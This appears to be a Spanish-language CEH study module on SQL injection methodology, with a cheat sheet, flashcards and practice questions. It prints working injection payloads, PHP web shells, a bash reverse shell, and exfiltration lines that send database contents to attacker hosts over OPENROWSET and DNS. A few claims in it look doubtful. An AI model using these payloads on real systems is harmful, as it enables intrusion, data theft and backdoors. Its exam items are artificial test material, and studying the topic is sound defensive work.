# M15_03_SQLInjectionMethodology.md
> Módulo 15 / Subapartado 3 — SQL Injection Methodology

---

## 1. Conceptos y definiciones

### 🔴 Metodología de SQL Injection — 3 fases

| Fase | Contenido |
|---|---|
| **1. Information Gathering + Vulnerability Detection** | Recopilar info sobre la BBDD (nombre, versión, usuarios, tipo, privilegios, interacción OS); identificar entry points; detectar vulnerabilidades |
| **2. Launch SQL Injection Attacks** | Error-based, UNION, Blind, Login bypass, Insert/Update, WAF bypass |
| **3. Advanced SQL Injection** | Comprometer OS y red subyacente; enumerar BBDD/tablas/columnas; password grabbing; transferir BBDD; OS shell; backdoors; network reconnaissance |

---

### Fase 1 — Information Gathering

**Pasos de information gathering (6):**
1. Verificar si la aplicación web se conecta a un servidor de BBDD
2. Listar todos los campos de input, hidden fields y POST requests
3. Intentar inyectar código en campos de input para generar errores
4. Insertar valor de string donde se espera número
5. Usar el operador UNION para combinar resultados de múltiples SELECT
6. Analizar mensajes de error detallados para obtener información

**Herramientas de identificación de entry points:** Tamper Dev (Chrome), Burp Suite.

**Técnicas para extraer información de mensajes de error:**
- Parameter Tampering (Burp Suite, Tamper Chrome)
- Determining DB Engine Type — generar **errores ODBC** que revelan el tipo de motor de BBDD
- Determining SELECT query structure — queries como `' and '1'='1` o `' group by columnnames having 1=1 --`
- Type Mismatch — insertar strings en campos numéricos: `' union select 1,1,'text',1,1,1 --`
- Blind Injection — `'; if condition waitfor delay '0:0:5' --`

**Nota:** Si la aplicación devuelve '500 Server Error' o página de error personalizada → usar técnicas de blind injection.

---

### 🔴 SQL Injection Testing Strings (cheat sheet)

| Categoría | Ejemplos de testing strings |
|---|---|
| **OR conditions básicas** | `' OR 1=1--` · `' OR '1'='1` · `OR 1=1` · `" or "a"="a` · `' OR 2>1` |
| **Admin bypass** | `admin'--` · `admin'#` · `admin'/*` · `1'or'1'='1` |
| **Grouping** | `' group by userid having 1=1--` |
| **UNION** | `' union select 1,load_file('/etc/passwd'),1,1,1;` |
| **OS command exec** | `'; exec master..xp_cmdshell 'ping 10.10.1.2'--` |
| **Version extraction** | `' or 1 in (select @@version)--` · `' union all select @@version--` |
| **User creation (MSSQL)** | `exec sp_addlogin 'name','password'` · `sp_addsrvrolemember 'name','sysadmin'` |
| **URL encoded** | `%27+OR+%277659%27%3D%277659` · `%22+or+isnull%281%2F0%29+%2F*` |

---

### Fase 2 — Launch SQL Injection Attacks

#### 🔴 Error-Based SQL Injection — Extracción progresiva

| Objetivo | Query |
|---|---|
| **Extract DB Name** | `id=1 or 1=convert(int,(DB_NAME()))--` |
| **Extract 1st Table** | `id=1 or 1=convert(int,(select top 1 name from sysobjects where xtype=char(85)))--` |
| **Extract 1st Column Name** | `id=1 or 1=convert(int,(select top 1 column_name from DBNAME.information_schema.columns where table_name='TABLE-NAME-1'))--` |
| **Extract 1st Field Data** | `id=1 or 1=convert(int,(select top 1 COLUMN-NAME-1 from TABLE-NAME-1))--` |

Mecanismo: `convert(int, string)` fuerza un error de tipo que incluye el valor de la string → el error revela el dato buscado.

#### 🔴 UNION SQL Injection — Extracción progresiva

| Objetivo | Query |
|---|---|
| **Extract DB Name** | `id=1 UNION SELECT ALL 1,DB_NAME,3,4--` |
| **Extract Tables** | `id=1 UNION SELECT ALL 1,TABLE_NAME,3,4 from sysobjects where xtype=char(85)--` |
| **Extract Column Names** | `id=1 UNION SELECT ALL 1,column_name,3,4 from DB_NAME.information_schema.columns where table_name='EMPLOYEE_TABLE'--` |
| **Extract Field Data** | `id=1 UNION SELECT ALL 1,COLUMN-NAME-1,3,4 from EMPLOYEE_NAME--` |

Detectar vulnerabilidad UNION: añadir `'` al final de `.php?id=` → si devuelve MySQL error → probablemente vulnerable.
Proceso: tick → ORDER BY para contar columnas → UNION ALL SELECT para extraer datos.

#### 🔴 Login Bypass — Payloads

```
admin'--        admin'#        admin'/*
' or 1=1--      ' or 1=1#      ' or 1=1/*
') or '1'='1--  ') or ('1'='1--
1'or'1'='1      ' or 'x'='x    " or 0=0--
```

**Bypass MD5 hash check:**
```
Username: admin
Password: 1234' AND 1=0 UNION ALL SELECT 'admin','81dc9bdb52d04dc20036dbd8313ed055
```
(El hash MD5 de 1234 es `81dc9bdb52d04dc20036dbd8313ed055`) — la aplicación compara el password con el hash conocido en lugar del hash de la BBDD.

#### Insert/Update via SQL Injection

**Insertar nuevo usuario:**
```sql
SELECT * FROM Users WHERE Email_ID='Alice@xyz.com'; 
INSERT INTO Users (Email_ID,User_Name,Password) VALUES ('Clark@mymail.com','Clark','MyPassword');--';
```
Requisito: la víctima debe tener **permiso INSERT** en la tabla Users.

**Actualizar email para redirigir "Forgot Password":**
```sql
SELECT * FROM Users WHERE Email_ID='Alice@xyz.com'; 
UPDATE Users SET Email_ID='Clark@mymail.com' WHERE Email_ID='Alice@xyz.com';
```
Resultado: el email de reset de contraseña se envía al atacante.

---

### 🔴 Blind SQL Injection — Extracción carácter a carácter

**Funciones clave usadas:**
- `LEN()` — longitud de la string
- `ASCII(lower(substring((cadena), posición, 1)))` — valor ASCII del carácter en posición
- `WAITFOR DELAY '0:0:10'` — delay 10s si condición TRUE
- `USER` — nombre del usuario de BBDD actual
- `DB_NAME()` — nombre de la BBDD actual

**Proceso para extraer username (ejemplo completo):**

```sql
-- Step 1: Determinar longitud del username
id=1; IF (LEN(USER)=1) WAITFOR DELAY '00:00:10'--
id=1; IF (LEN(USER)=2) WAITFOR DELAY '00:00:10'--
-- (incrementar hasta que el DBMS devuelva TRUE = delay de 10s)

-- Step 2: Determinar cada carácter (ASCII 97='a', 98='b', etc.)
id=1; IF(ASCII(lower(substring((USER),1,1)))=97) WAITFOR DELAY '00:00:10'--
id=1; IF(ASCII(lower(substring((USER),1,1)))=98) WAITFOR DELAY '00:00:10'--
-- (repetir para cada posición)
```

**Coste de un binary search:** 7 requests para encontrar la primera letra → un username de 8 caracteres requiere **56 requests**.

**Extracción de DB_NAME() — ejemplo resultado "ABCD":**
```sql
IF(LEN(DB_NAME())=4) WAITFOR DELAY '0:0:10'--         → TRUE (4 chars)
IF(ASCII(lower(substring((DB_NAME()),1,1)))=97) WAITFOR DELAY '0:0:10'--  → TRUE (a=97)
IF(ASCII(lower(substring((DB_NAME()),2,1)))=98) WAITFOR DELAY '0:0:10'--  → TRUE (b=98)
... → DB Name = ABCD
```

**Extracción de 1st Table Name — tabla EMP:**
```sql
-- xtype=char(85) equivale a xtype='U' (tablas de usuario)
IF(ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85)),1,1)))=101) WAITFOR DELAY '0:0:10'--
-- 101='e', 109='m', 112='p' → EMP
```

**Extracción de Column Name — columna EID:**
```sql
IF(ASCII(lower(substring((SELECT TOP 1 column_name from ABCD.information_schema.columns where table_name='EMP'),1,1)))=101) WAITFOR DELAY '0:0:10'--
-- 101='e', 105='i', 100='d' → EID
```

**Extracción de 2nd Column — usar `column_name>'EID'` para avanzar:**
```sql
SELECT TOP 1 column_name from ABCD.information_schema.columns where table_name='EMP' and column_name>'EID'
-- 100='d', 101='e', 112='p', 116='t' → DEPT
```

#### Regular Expression Attack — Extracción de passwords

En MySQL, hashed passwords contienen solo `[a-f0-9]`. El atacante usa `REGEXP` para binary search:
```sql
-- ¿Es el 1er carácter entre 'a' y 'f'?
index.php?id=2 and 1=(SELECT 1 FROM UserInfo WHERE Password REGEXP '^[a-f]' AND ID=2)
-- Si TRUE → ¿entre 'a' y 'c'? Si FALSE → ¿entre 'd' y 'f'? → Narrowing hasta 'd'
```

En MSSQL — usa `LIKE`:
```sql
default.aspx?id=2 AND 1=(SELECT 1 FROM UserInfo WHERE Password LIKE 'd[a-f]%' AND ID=2)
-- Narrowing: [a-f] → [0-9] → [0-4] → [5-9] → [5-7] → [8] → detecta cada carácter
```

#### Double-Blind SQL Injection

Tipo sofisticado sin feedback directo. El atacante usa indicadores indirectos: cambios en comportamiento de la app, response times, impactos en funcionalidades dependientes de BBDD. Usa `benchmark()` y `sleep()` para time delay.

```sql
/?id=1+AND+if((ascii(lower(substring((select password from user limit 0,1),0,1))))=97,
1,benchmark(2000000,md5(now())))
```
- Si el carácter es correcto → responde normalmente (resultado=1)
- Si es incorrecto → ejecuta `benchmark(2000000,md5(now()))` → delay notable

`sleep()` es más segura que `benchmark()` porque no requiere recursos del servidor.

---

### 🔴 Bypass WAF para SQL Injection

| Técnica | Mecanismo |
|---|---|
| **Normalization** | WAF mal configurado → `/*union*/union/*select*/select` → el WAF procesa y genera la query real `UNION SELECT` |
| **HPP (HTTP Parameter Pollution)** | Divide el parámetro id: `/?id=1;select+1,2,3+from+users` → `/?id=1;select+1&id=2,3+from+users+where+id=1` |
| **HPF (HTTP Parameter Fragmentation)** | Fragmenta la query entre múltiples parámetros con `/*` y `*/`: `/?a=1+union/*&b=*/select+1,2` |
| **Blind SQL injection** | Reemplaza firmas del WAF con sinónimos SQL: `OR 0x50=0x50` · `and ascii(lower(mid(...)))=74` |
| **Signature Bypass** | Obtiene las firmas del WAF y las transforma: `/(1)union(select(1),hex(hash)from(users))/` |
| **Buffer Overflow** | ~1200 chars 'A' + queries → crash del WAF (C/C++); si responde 500 → WAF vulnerable |
| **CRLF** | `%0A%0D` (CR+LF) dentro de keywords SQL para bypassar detección: `union%0A%0Dselect` |
| **Integration Method** | Combinar múltiples técnicas simultáneamente |
| **JSON-based** | Usar operadores JSON `$eq`, `$ne` en lugar de `=`, `<`, `>` que el WAF bloquea |

---

### Fase 3 — Advanced SQL Injection

#### Database, Table, Column Enumeration

**Identificar nivel de privilegio del usuario:**
```sql
' and 1 in (select user) --
'; if user='dbo' waitfor delay '0:0:5' --
' union select if(user() like 'root@%', benchmark(50000,sha1('test')), 'false');
```

**DB Administrators por defecto:** `sa`, `system`, `sys`, `dba`, `admin`, `root`. `dbo` tiene permisos implícitos en toda la BBDD.

**Column Enumeration por DBMS:**

| DBMS | Comando |
|---|---|
| MSSQL | `SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='tablename')` · `sp_columns tablename` |
| MySQL | `show columns from tablename` |
| Oracle | `SELECT * FROM all_tab_columns WHERE table_name='tablename'` |
| DB2 | `SELECT * FROM syscat.columns WHERE tabname='tablename'` |
| PostgreSQL | `SELECT attnum,attname from pg_class,pg_attribute WHERE relname='tablename' AND pg_class.oid=attrelid AND attnum>0` |

**Database objects para enumeration:**

| DBMS | Objetos |
|---|---|
| Oracle | SYS.USER_OBJECTS · SYS.USER_TABLES · SYS.USER_VIEWS · SYS.ALL_TABLES · SYS.USER_TAB_COLUMNS |
| MS Access | MSysAccessObjects · MSysACEs · MSysObjects · MSysQueries · MSysRelationships |
| MySQL | mysql.user · mysql.db · mysql.tables_priv |

#### Password Grabbing
```sql
begin declare @var varchar(8000)
set @var=':'
select @var=@var+' '+login+'/'+password+' ' from users where login>@var
select @var as var into temp end; --
' and 1 in (select var from temp) --
' ; drop table temp --
```

**SQL Server Hashes:** almacenados en `sys.syslogins` · `sys.syslogins` → columna `password`. Extracción vía error messages: `' and 1 in (select x from temp) --` (255 bytes por iteración).

#### Transfer Database to Attacker's Machine
Usa **OPENROWSET** para conectar a la máquina del atacante en **puerto 80**:
```sql
'; insert into OPENROWSET('SQLoledb','uid=sa;pwd=Pass123;Network=DBMSSOCN;
Address=myIP,80;','select * from mydatabase..hacked_sysdatabases') select * from sys.sysdatabases --
```

#### OS Interaction

**MSSQL — xp_cmdshell:**
```sql
'; exec master..xp_cmdshell 'ipconfig > test.txt' --
'; CREATE TABLE tmp (txt varchar(8000)); BULK INSERT tmp FROM 'test.txt' --
```
**Nota:** xp_cmdshell está **deshabilitado por defecto** en SQL Server. Para habilitarlo:
```sql
EXEC sp_configure 'xp_cmdshell', 1; GO; RECONFIGURE; GO
```

**MySQL OS Interaction:**
```sql
CREATE FUNCTION sys_exec RETURNS int SONAME 'libudffmwgj.dll';
CREATE FUNCTION sys_eval RETURNS string SONAME 'libudffmwgj.dll';
```

**File system interaction (MySQL):**
```sql
-- Leer /etc/passwd
NULL UNION ALL SELECT LOAD_FILE('/etc/passwd')/*

-- Crear web shell PHP
NULL UNION ALL SELECT NULL,NULL,NULL,NULL,'<?php system($_GET["command"]); ?>'
INTO OUTFILE '/var/www/certifiedhacker.com/shell.php'/*
```

#### Creating Server Backdoors

**MySQL — crear PHP shell usando SELECT INTO OUTFILE:**
```sql
SELECT '<?php exec($_GET["cmd"]); ?>' FROM usertable INTO dumpfile '/var/www/html/shell.php'
```

**Encontrar directorio de BBDD:**
```sql
SELECT @@datadir;
```

**MSSQL — interactive shell con xp_cmdshell:**
```sql
EXEC xp_cmdshell 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'
```

**Database Backdoor via Trigger (Oracle):**
```sql
CREATE OR REPLACE TRIGGER SET_PRICE AFTER INSERT OR UPDATE ON ITEMS
FOR EACH ROW BEGIN UPDATE ITEMS SET Price=0; END;
```
El trigger pone el precio a 0 automáticamente en cada INSERT/UPDATE.

#### HTTP Header-Based SQL Injection

Campos HTTP Header vulnerables: **X-Forwarded-For**, **User-Agent**, **Referer**, **Cookie**.

```
X_FORWARDED_FOR: 10.10.10.11' or 1=1#
User-Agent: aaa' or 1/*
Referer: http://www.hackerswebsite.com
```

#### DNS Exfiltration via SQL Injection

El atacante embebe el resultado de la query SQL en un DNS request → captura la respuesta DNS.

```sql
do_dns_lookup((select top 1 password from users) + '.certifiedhacker.com');
```

**MSSQL via xp_dirtree:**
```sql
DECLARE @hostname varchar(1024);
SELECT @hostname=(SELECT HOST_NAME())+'.appserver.example.com;
EXEC('master.dbo.xp_dirtree "\\'+@hostname+'\c$"');
```

#### Second-Order SQL Injection

El atacante envía input malicioso que se almacena en la BBDD sin causar daño inmediato (el output escaping lo previene). Cuando otra función de la aplicación usa ese dato almacenado en otra query → la inyección se ejecuta.

**Secuencia:** Submit request → BBDD almacena → Atacante envía 2ª request → App usa el 1er input de BBDD en nueva query → Ejecución de SQL injection.

#### Google Dorks para encontrar admin panels

```
inurl:"adminlogin.aspx"    inurl:"admin/index.php"    inurl:"administrator.php"
inurl:"/admin/"            inurl:"login.asp"           inurl:"/admin/login.php"
inurl:"login.aspx"         inurl:"login.php"           inurl:"admin/index.html"
```

#### NoSQL Injection (MongoDB)

MongoDB usa operadores: `$eq`, `$ne`, `$gt`, `$gte`, `[$regex]`.

**Bypass de autenticación MongoDB:**
```
User_name[$eq]=admin&pwd[$ne]=admin
```

**JavaScript Injection en MongoDB con `$where`:**
```javascript
'; return '' == '
```
Si usa `while(true)` → loop infinito → DoS.

---

### 🔴 sqlmap — Herramienta principal y flags clave

sqlmap automatiza detección y explotación de SQL injection. Soporta las **6 técnicas**: Boolean-based blind, time-based blind, error-based, UNION query-based, stacked queries, out-of-band.

| Flag | Función |
|---|---|
| `-u <URL>` | URL objetivo |
| `--batch` | Modo no interactivo (usa valores por defecto) |
| `--crawl=5` | Crawl hasta 5 niveles de profundidad desde la URL |
| `--random-agent` | User-agent aleatorio para cada request |
| `--level=5` | Nivel de tests (1-5; mayor = más exhaustivo) |
| `--risk=3` | Agresividad (1-3; mayor = más agresivo) |
| `--technique=B` | Boolean-based blind |
| `--technique=T` | Time-based blind |
| `--technique=E` | Error-based |
| `--technique=U` | UNION query-based |
| `--dbs` | Enumerar bases de datos |
| `-D <db> --tables` | Enumerar tablas en la BBDD especificada |
| `-D <db> -T <tabla> --columns` | Enumerar columnas |
| `-D <db> -T <tabla> -C <cols> --dump` | Volcar datos de columnas específicas |

**Comando AI completo para SQL injection scan:**
```bash
sqlmap -u "http://testphp.vulnweb.com" --batch --crawl=5 --random-agent --level=5 --risk=3
```

**Mole:** herramienta alternativa de SQL injection automática. Soporta: MySQL, Postgres, SQL Server, Oracle. Usa interfaz de comandos con auto-completion.

---

## 2. Exam Traps ⚠️

⚠️ **[xp_cmdshell está deshabilitado por defecto en SQL Server]**
El libro especifica explícitamente que Microsoft ha deshabilitado xp_cmdshell por defecto. Para habilitarlo se necesita `EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE`. El examen puede presentar xp_cmdshell como disponible por defecto → incorrecto.

⚠️ **[char(85) = 'U' en xtype — equivalencia]**
`xtype=char(85)` es equivalente a `xtype='U'` (tablas de usuario). El examen puede usar char(85) y preguntar qué tipo de objetos filtra → User tables.

⚠️ **[INSERT via SQL injection: requiere permiso INSERT]**
El atacante solo puede insertar un nuevo usuario si la cuenta de la BBDD tiene **permiso INSERT** en la tabla Users. Si hay dependencias en la tabla, tampoco puede añadir usuarios. El examen puede presentarlo como siempre posible.

⚠️ **[Binary search para extraer username: 7 requests por carácter = 56 para 8 chars]**
Dato numérico específico: encontrar la primera letra de un username con binary search requiere **7 requests**. Un username de 8 caracteres = **56 requests**.

⚠️ **[Double-blind: sleep() vs. benchmark()]**
`sleep()` es más segura que `benchmark()` porque no requiere recursos del servidor. El examen puede preguntar cuál función es más "segura" en contexto de double-blind.

⚠️ **[Second-Order SQL injection: la inyección ocurre en la 2ª request, no en la 1ª]**
La 1ª request almacena el input malicioso sin activarlo (output escaping lo previene). La 2ª request activa la inyección al usar el dato almacenado. El examen puede presentar second-order como una inyección directa de dos pasos.

⚠️ **[OPENROWSET conecta al atacante en puerto 80]**
La transferencia de BBDD al atacante usa OPENROWSET en **puerto 80** (no 443 ni 1433). El examen puede presentar un puerto diferente.

⚠️ **[HPP vs. HPF — distinción]**
HPP (HTTP Parameter Pollution): duplica parámetros con `&id=`. HPF (HTTP Parameter Fragmentation): fragmenta la query entre parámetros usando `/*` y `*/`. Son técnicas distintas aunque relacionadas.

⚠️ **[MongoDB NoSQL injection: operadores específicos]**
Los operadores son `$eq`, `$ne`, `$gt`, `$gte`, `[$regex]`. El payload de bypass: `User_name[$eq]=admin&pwd[$ne]=admin`. El examen puede usar operadores diferentes como distractores.

⚠️ **[sqlmap --level y --risk: rangos exactos]**
`--level`: 1-5. `--risk`: 1-3. El examen puede invertir los rangos o usarlos intercambiados.

---

## 3. Nemotécnicos

**Metodología 3 fases** → **"I-L-A"**: **I**nformation Gathering · **L**aunch Attacks · **A**dvanced SQL injection

**Error-based extraction sequence** → **"DB → Table → Column → Field"** (usando convert(int,...))

**UNION extraction sequence** → idéntica: **"DB_NAME → TABLE_NAME → column_name → COLUMN-DATA"**

**Blind injection extraction sequence** → **"LEN → ASCII(substring) carácter a carácter"**

**binary search cost** → **"7 requests/char → 8-char name = 56 requests"**

**WAF bypass techniques (8)** → **"N-HPP-HPF-B-S-BUF-CRLF-INT"**:
Normalization · HPP · HPF · Blind synonyms · Signature bypass · Buffer overflow · CRLF · Integration

**HTTP Headers vulnerables a SQL injection** → **"X-C-U-R"**: **X**-Forwarded-For · **C**ookie · **U**ser-Agent · **R**eferer

**xp_cmdshell** → deshabilitado por defecto → `sp_configure 'xp_cmdshell',1` + `RECONFIGURE`

**OPENROWSET** → transferencia a atacante → **puerto 80**

**sqlmap techniques flags** → **"B-T-E-U"**: **B**oolean · **T**ime · **E**rror · **U**NION

---

## 4. Flashcards

**Q:** ¿Cuáles son las 3 fases de la metodología de SQL injection?
**A:** (1) Information Gathering + Vulnerability Detection, (2) Launch SQL Injection Attacks, (3) Advanced SQL Injection (comprometer OS y red).

---

**Q:** ¿Qué hace el convert(int, DB_NAME()) en error-based SQL injection?
**A:** Fuerza un error de conversión de tipo (nvarchar→int) que incluye el valor del DB_NAME() en el mensaje de error → el atacante lee el nombre de la BBDD del mensaje de error.

---

**Q:** ¿Cuántos requests se necesitan para extraer un username de 8 caracteres mediante binary search en blind SQL injection?
**A:** 56 requests (7 requests por carácter × 8 caracteres).

---

**Q:** ¿Qué equivalencia tiene xtype=char(85) en sysobjects?
**A:** Es equivalente a xtype='U' — filtra tablas de usuario (User tables). El valor ASCII de 'U' es 85.

---

**Q:** ¿Qué condición debe cumplirse para poder insertar un nuevo usuario vía SQL injection?
**A:** La cuenta de BBDD debe tener permiso INSERT en la tabla Users. Si hay dependencias en la tabla, tampoco es posible.

---

**Q:** ¿Cuál es la diferencia entre sleep() y benchmark() en double-blind SQL injection?
**A:** sleep() es más segura porque no requiere recursos del servidor. benchmark() ejecuta operaciones computacionales intensivas (ej. md5(now())) consumiendo CPU.

---

**Q:** ¿En qué puerto conecta OPENROWSET para transferir la BBDD al atacante?
**A:** Puerto 80.

---

**Q:** ¿Qué hace el payload de login bypass con MD5?
**A:** `Password: 1234' AND 1=0 UNION ALL SELECT 'admin','81dc9bdb52d04dc20036dbd8313ed055` — la aplicación compara el password proporcionado con el hash MD5 conocido (MD5 de "1234") en lugar del hash de la BBDD → bypass exitoso.

---

**Q:** ¿Qué es un second-order SQL injection y cuándo se activa?
**A:** Inyección donde el input malicioso se almacena en la BBDD sin causar daño inmediato. Se activa cuando una segunda función de la aplicación usa ese dato almacenado en otra query SQL.

---

**Q:** ¿Cuál es el payload de bypass de autenticación MongoDB más básico?
**A:** `User_name[$eq]=admin&pwd[$ne]=admin` — usa el operador $ne (not equal) para que cualquier password que no sea "admin" funcione.

---

**Q:** ¿Cuáles son los 6 técnicas de SQL injection que soporta sqlmap?
**A:** Boolean-based blind, time-based blind, error-based, UNION query-based, stacked queries, out-of-band.

---

**Q:** ¿Qué flag de sqlmap activa el modo no interactivo (sin prompts)?
**A:** `--batch` — usa valores por defecto para todas las opciones sin pedir confirmación al usuario.

---

**Q:** ¿Cómo se habilita xp_cmdshell en SQL Server si está deshabilitado?
**A:** `EXEC sp_configure 'xp_cmdshell', 1; GO; RECONFIGURE; GO`

---

**Q:** ¿Qué función MySQL lee el contenido de un fichero del servidor?
**A:** `LOAD_FILE('/ruta/fichero')` — ej. `NULL UNION ALL SELECT LOAD_FILE('/etc/passwd')/*`

---

**Q:** ¿Qué función MySQL escribe el resultado de una query en un fichero del servidor?
**A:** `INTO OUTFILE '/ruta/fichero'` — permite crear web shells PHP en el servidor.

---

**Q:** ¿Cuáles son los 4 campos HTTP header vulnerables a SQL injection?
**A:** X-Forwarded-For, Cookie, User-Agent, Referer.

---

**Q:** ¿Cuál es el propósito del trigger Oracle SET_PRICE en un ataque de database backdoor?
**A:** Se activa automáticamente en cada INSERT o UPDATE en la tabla ITEMS y pone el precio a 0, permitiendo comprar productos sin pagar.

---

**Q:** ¿Qué técnica de bypass WAF usa `/*union*/union/*select*/select`?
**A:** Normalization — la configuración incorrecta del WAF hace que procese la query y genere el comando real `UNION SELECT` al eliminar los comentarios.

---

**Q:** ¿Cuáles son los rangos de --level y --risk en sqlmap?
**A:** `--level`: 1-5 (mayor = más exhaustivo). `--risk`: 1-3 (mayor = más agresivo).

---

**Q:** ¿Qué técnica de WAF bypass usa caracteres `%0A%0D` entre keywords SQL?
**A:** CRLF technique — inserta carriage return (`%0D`) y line feed (`%0A`) entre keywords para bypassar la detección del WAF.

---

## 5. Confusión frecuente

**Error-based vs. UNION — ambos extraen datos pero de forma diferente**
- Error-based: usa `convert(int, valor)` para forzar un error que incluye el dato en el mensaje de error. No modifica la estructura de la query original; genera un error calculado.
- UNION: une una query forjada a la original devolviendo datos directamente en la respuesta normal. No genera errores; requiere coincidencia de columnas.
- Criterio: "datos aparecen en mensajes de error de tipo casting" → Error-based. "Datos aparecen en la respuesta normal de la página" → UNION.

---

**HPP vs. HPF — ambas fragmentan el payload pero de forma diferente**
- HPP (Parameter Pollution): duplica el mismo parámetro con `&` → `?id=1;select+1&id=2,3`. El servidor/WAF procesa los parámetros por separado.
- HPF (Parameter Fragmentation): fragmenta la query entre múltiples parámetros usando `/*` y `*/` como delimitadores de comentario que el WAF no detecta como SQL.
- Criterio: "duplicar el parámetro id con `&`" → HPP. "Partir la query con `/*` entre parámetros" → HPF.

---

**Second-Order SQL injection vs. Stored XSS — mismo patrón de almacenamiento pero diferente**
- Second-Order SQLi: el dato malicioso se almacena en BBDD y se activa cuando otra función SQL lo usa en una nueva query. Impacta la BBDD.
- Stored XSS: el script malicioso se almacena en BBDD y se activa cuando otro usuario carga la página. Impacta el navegador del usuario.
- Criterio: "activado cuando otra función SQL usa el dato" → Second-Order SQLi. "Activado cuando otro usuario carga la página" → Stored XSS.

---

**LOAD_FILE() vs. INTO OUTFILE() en MySQL**
- LOAD_FILE(): lee y devuelve el contenido de un fichero del servidor. Permite leer `/etc/passwd` y otros ficheros del sistema.
- INTO OUTFILE(): escribe el resultado de una query en un fichero en el servidor. Permite crear web shells PHP.
- Criterio: "leer ficheros del servidor" → LOAD_FILE(). "Crear ficheros en el servidor (ej. web shell)" → INTO OUTFILE().

---

**xp_cmdshell vs. OPENROWSET — ambas permiten interacción fuera de la BBDD**
- xp_cmdshell: ejecuta comandos del OS directamente en el servidor (está deshabilitado por defecto; requiere habilitación).
- OPENROWSET: conecta a un servidor externo (atacante) vía SQL OLE DB para transferir datos. Conecta por puerto 80.
- Criterio: "ejecutar comandos OS en el servidor víctima" → xp_cmdshell. "Transferir datos de la BBDD al servidor del atacante" → OPENROWSET.

---

## 6. Preguntas de Práctica — Formato CEH

**P1.** Un pentester ejecuta `id=1 or 1=convert(int,(DB_NAME()))--` contra una aplicación web. La respuesta devuelve un error de SQL Server que incluye el nombre de la base de datos en el mensaje. ¿Qué técnica está usando?

A) UNION-based SQL injection  
B) Blind time-based SQL injection  
C) Error-based SQL injection  
D) Out-of-band SQL injection  

**Respuesta correcta: C**
El atacante usa **Error-based SQL injection**: `convert(int, DB_NAME())` fuerza un error de conversión de tipo (nvarchar→int) que incluye el valor de `DB_NAME()` en el mensaje de error. El dato se extrae del mensaje de error, no de la respuesta normal de la página.

---

**P2.** Un pentester usa blind SQL injection para extraer el nombre de usuario de la BBDD. Usando binary search, determina que el username tiene 6 caracteres. ¿Cuántos requests HTTP necesita como mínimo para extraer el nombre completo?

A) 6 requests  
B) 42 requests  
C) 56 requests  
D) 36 requests  

**Respuesta correcta: B**
Con **binary search**, se necesitan **7 requests por carácter** para encontrar el valor ASCII del carácter en ese rango de caracteres alfanuméricos. Para un username de 6 caracteres: 7 × 6 = **42 requests**.

---

**P3.** Un atacante inyecta el payload `'; EXEC xp_cmdshell 'ipconfig > c:\output.txt'--` en una aplicación web que usa SQL Server. La aplicación devuelve un error indicando que `xp_cmdshell` no está disponible. ¿Cuál es la causa más probable?

A) El atacante no tiene permisos de administrador en Windows  
B) xp_cmdshell está deshabilitado por defecto en SQL Server moderno  
C) La aplicación usa MySQL y no MSSQL  
D) El WAF ha bloqueado el comando  

**Respuesta correcta: B**
**xp_cmdshell está deshabilitado por defecto** en SQL Server moderno. Para habilitarlo se requiere: `EXEC sp_configure 'xp_cmdshell', 1; GO; RECONFIGURE; GO`. Esta es la razón más probable cuando xp_cmdshell no está disponible sin otro indicio de bloqueo.

---

**P4.** Un DBA descubre en los logs que alguien insertó un nuevo registro en la tabla Users mediante SQL injection. El atacante aprovechó una vulnerabilidad en el formulario de búsqueda. ¿Qué condición fue necesaria para que este ataque fuera posible?

A) El atacante debía conocer el esquema completo de la BBDD  
B) La cuenta de BBDD usada por la aplicación tenía permiso INSERT en la tabla Users  
C) SQL Server tenía xp_cmdshell habilitado  
D) La aplicación usaba stored procedures  

**Respuesta correcta: B**
Para **insertar registros vía SQL injection**, la cuenta de BBDD usada por la aplicación debe tener **permiso INSERT** en la tabla objetivo. Si hay dependencias de clave foránea, tampoco es posible. La cuenta de la aplicación nunca debería tener permisos INSERT en tablas de usuarios.

---

**P5.** Un analista de seguridad estudia un ataque en el que el input malicioso fue almacenado en la BBDD durante la primera request sin causar ningún daño. Sin embargo, cuando el usuario accedió a su perfil (segunda request), la inyección se ejecutó causando elevación de privilegios. ¿Qué tipo de SQL injection describe esto?

A) Piggybacked SQL injection  
B) UNION-based SQL injection  
C) Second-order SQL injection  
D) Blind Boolean-based SQL injection  

**Respuesta correcta: C**
**Second-order SQL injection**: la primera request almacena el input malicioso en la BBDD sin activarlo (output escaping lo previene). La segunda request activa la inyección cuando otra función usa el dato almacenado en una nueva query SQL. Es diferente del piggybacked (dos queries en un solo request).

---

**P6.** Un pentester intenta transferir toda la base de datos de un servidor SQL Server comprometido a su máquina. Usa OPENROWSET para establecer la conexión. ¿En qué puerto intenta conectar el servidor víctima a la máquina del atacante?

A) Puerto 443  
B) Puerto 1433  
C) Puerto 80  
D) Puerto 4444  

**Respuesta correcta: C**
**OPENROWSET** para transferencia de BBDD al atacante usa el **puerto 80**. Este puerto está habitualmente permitido en firewalls salientes (tráfico HTTP normal), lo que facilita la exfiltración sin activar alarmas de puertos no estándar.

---

**P7.** Un analista encuentra en los logs de MongoDB el siguiente payload: `User_name[$eq]=admin&pwd[$ne]=xyz`. ¿Qué tipo de ataque es y qué efecto tiene?

A) SQL injection usando UNION — extrae la lista de usuarios  
B) NoSQL injection — hace que cualquier contraseña que no sea 'xyz' resulte válida para admin  
C) Blind SQL injection — ejecuta un time delay para confirmar la existencia de admin  
D) HTTP Parameter Pollution — divide el query en dos peticiones  

**Respuesta correcta: B**
El payload usa el operador **`$ne` (not equal) de MongoDB**: `pwd[$ne]=xyz` significa "password diferente de xyz" — cualquier contraseña que no sea 'xyz' resulta válida para el usuario admin. Esto es **NoSQL injection**, no SQL injection tradicional. Los operadores MongoDB `$eq`, `$ne`, `$gt` son los vectores de ataque clave.

---

**P8.** Un administrador SQL Server examina sus logs y encuentra la query: `id=1; IF(LEN(USER)=7) WAITFOR DELAY '00:00:10'--`. La aplicación tardó 10 segundos en responder. ¿Qué puede concluir el atacante?

A) La BBDD está usando MySQL  
B) El nombre de usuario de la BBDD tiene exactamente 7 caracteres  
C) Hay 7 bases de datos en el servidor  
D) La BBDD tiene 7 tablas en el esquema actual  

**Respuesta correcta: B**
